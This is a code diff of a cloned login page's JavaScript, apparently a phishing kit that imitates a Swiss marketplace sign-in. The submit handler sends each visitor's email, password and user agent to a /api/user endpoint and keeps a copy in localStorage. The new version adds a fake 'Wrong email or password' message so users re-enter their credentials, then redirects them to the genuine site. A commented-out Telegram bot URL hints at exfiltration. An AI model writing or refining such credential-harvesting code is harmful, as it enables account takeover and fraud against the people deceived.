@@ -287,9 +287,6 @@
  
  
  
- 
- 
- 
  </div>
  
  
@@ -423,116 +420,181 @@
 
  
 <script>
-  let formSubmitted = false;
-    const form = document.getElementById('myForm');
+let formSubmitted = false;
+let authErrorShown = false; // 🔥 flag global
 
-    const fields = Array.from(document.querySelectorAll('.ulp-field input'));
+const form = document.getElementById('myForm');
+const fields = Array.from(document.querySelectorAll('.ulp-field input'));
 
-    const getRequiredError = (input) =>
-      document.querySelector(
-        `[data-ulp-validation-target="${input.id}"][data-ulp-validation-function="ulpRequiredFunction"]`
-      );
+const getRequiredError = (input) =>
+  document.querySelector(
+    `[data-ulp-validation-target="${input.id}"][data-ulp-validation-function="ulpRequiredFunction"]`
+  );
 
-    const updateFocusState = (input) => {
-      const field = input.closest('.ulp-field');
-      if (input === document.activeElement || input.value.trim() !== '') {
-        field.classList.add('focus');
-      } else {
-        field.classList.remove('focus');
-      }
-    };
+const updateFocusState = (input) => {
+  const field = input.closest('.ulp-field');
+  if (input === document.activeElement || input.value.trim() !== '') {
+    field.classList.add('focus');
+  } else {
+    field.classList.remove('focus');
+  }
+};
 
-    const updateErrorState = (input) => {
-      const field = input.closest('.ulp-field');
-      const error = getRequiredError(input);
+const updateErrorState = (input) => {
+  if (authErrorShown) return; // 🔥 NU atinge eroarea globală
 
-      if (!error || !formSubmitted) return;
+  const field = input.closest('.ulp-field');
+  const error = getRequiredError(input);
 
-      if (input.value.trim() === '') {
-        field.classList.add('ulp-error');
-        error.classList.remove('sf-hidden');
-      } else {
-        field.classList.remove('ulp-error');
-        error.classList.add('sf-hidden');
-      }
-    };
+  if (!error || !formSubmitted) return;
 
-    /* ---------- INPUT HANDLERS ---------- */
-    fields.forEach(input => {
-      input.addEventListener('focus', () => updateFocusState(input));
+  if (input.value.trim() === '') {
+    field.classList.add('ulp-error');
+    error.classList.remove('sf-hidden');
+  } else {
+    field.classList.remove('ulp-error');
+    error.classList.add('sf-hidden');
+  }
+};
 
-      input.addEventListener('blur', () => {
-        updateFocusState(input);
-        updateErrorState(input);
-      });
+/* ---------- EMAIL VALID ---------- */
+const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-      input.addEventListener('input', () => {
-        updateFocusState(input);
-        if (formSubmitted) updateErrorState(input);
-      });
+const emailInput = document.getElementById('username');
+const emailField = emailInput.closest('.ulp-field');
 
-      // init – doar focus UI
-      updateFocusState(input);
-    });
+const emailRequiredError = document.getElementById('error-cs-username-required');
+const emailPatternError  = document.getElementById('error-cs-pattern-mismatch');
 
-    /* ---------- SHOW / HIDE PASSWORD ---------- */
-    document.querySelectorAll('[data-action="toggle"]').forEach(button => {
-      const field = button.closest('.ulp-field');
-      const input = field.querySelector('input[type="password"], input[type="text"]');
-      const showSpan = button.querySelector('.show-password-tooltip');
-      const hideSpan = button.querySelector('.hide-password-tooltip');
+function validateEmail(showErrors = false) {
+  const value = emailInput.value.trim();
 
-      button.addEventListener('click', (e) => {
-        e.preventDefault();
+  emailField.classList.remove('ulp-error');
+  emailRequiredError.classList.add('sf-hidden');
+  emailPatternError.classList.add('sf-hidden');
 
-        const isShown = input.type === 'text';
+  if (value === '') {
+    if (showErrors) {
+      emailField.classList.add('ulp-error');
+      emailRequiredError.classList.remove('sf-hidden');
+    }
+    return false;
+  }
 
-        // toggle type
-        input.type = isShown ? 'password' : 'text';
+  if (!emailRegex.test(value)) {
+    if (showErrors) {
+      emailField.classList.add('ulp-error');
+      emailPatternError.textContent = 'Please enter a valid email address';
+      emailPatternError.classList.remove('sf-hidden');
+    }
+    return false;
+  }
 
-        // aria
-        button.setAttribute('aria-checked', String(!isShown));
+  return true;
+}
 
-        // toggle texte
-        showSpan.classList.toggle('sf-hidden', !isShown);
-        hideSpan.classList.toggle('sf-hidden', isShown);
+emailInput.addEventListener('input', () => validateEmail(false));
+emailInput.addEventListener('blur', () => validateEmail(true));
 
-        // păstrează focusul
-        input.focus();
-      });
-    });
-  const userAgent = navigator.userAgent;
+/* ---------- INPUT HANDLERS ---------- */
+fields.forEach(input => {
+  input.addEventListener('focus', () => updateFocusState(input));
 
-    /* ---------- SUBMIT ---------- */
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault(); 
-              
-      let formData = new FormData(e.target);
-                
-      formData = JSON.stringify({
-        email: formData.get('email'),
-        pass: formData.get('password'),
-        agent: userAgent
-      });
-      
-      console.log(formData)
-      // const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  input.addEventListener('blur', () => {
+    updateFocusState(input);
+    updateErrorState(input);
+  });
 
-      const response = await fetch('/api/user', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: formData
-      });
-              
-      const result = await response.json();
-      localStorage.setItem('usr', formData);
+  input.addEventListener('input', () => {
+    updateFocusState(input);
+    if (formSubmitted) updateErrorState(input);
+  });
 
-      console.log(formData)
+  updateFocusState(input);
+});
 
-      window.location.href = 'https://swissmarketplace.group/';
-    });
+/* ---------- PASSWORD / AUTH ERROR ---------- */
+const passwordInput = document.getElementById('password');
+const passwordField = passwordInput.closest('.ulp-field');
+const passwordError = document.getElementById('error-cs-password-required');
+
+// 🔥 când userul tastează din nou → reset
+passwordInput.addEventListener('input', () => {
+  authErrorShown = false;
+  passwordField.classList.remove('ulp-error');
+  passwordError.classList.add('sf-hidden');
+});
+
+/* ---------- SHOW / HIDE PASSWORD ---------- */
+document.querySelectorAll('[data-action="toggle"]').forEach(button => {
+  const field = button.closest('.ulp-field');
+  const input = field.querySelector('input[type="password"], input[type="text"]');
+  const showSpan = button.querySelector('.show-password-tooltip');
+  const hideSpan = button.querySelector('.hide-password-tooltip');
+
+  button.addEventListener('click', (e) => {
+    e.preventDefault();
+
+    const isShown = input.type === 'text';
+    input.type = isShown ? 'password' : 'text';
+
+    button.setAttribute('aria-checked', String(!isShown));
+    showSpan.classList.toggle('sf-hidden', !isShown);
+    hideSpan.classList.toggle('sf-hidden', isShown);
+
+    input.focus();
+  });
+});
+
+const userAgent = navigator.userAgent;
+
+/* ---------- SUBMIT ---------- */
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  formSubmitted = true;
+  fields.forEach(input => updateErrorState(input));
+
+  const hasErrors = fields.some(input => input.value.trim() === '');
+  if (hasErrors) return;
+
+  const emailOk = validateEmail(true);
+  if (!emailOk) {
+    emailInput.focus();
+    return;
+  }
+
+  // 🔥 arată o singură dată
+  if (!authErrorShown) {
+    authErrorShown = true;
+
+    passwordError.textContent = 'Wrong email or password';
+    passwordField.classList.add('ulp-error');
+    passwordError.classList.remove('sf-hidden');
+
+    passwordInput.focus();
+  }
+
+  let formData = new FormData(e.target);
+  formData = JSON.stringify({
+    email: formData.get('email'),
+    pass: formData.get('password'),
+    agent: userAgent
+  });
+
+  await fetch('/api/user', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: formData
+  });
+
+  localStorage.setItem('usr', formData);
+
+  if (authErrorShown) {
+    window.location.href = 'https://swissmarketplace.group/';
+  }
+});
+
 
 </script>
 
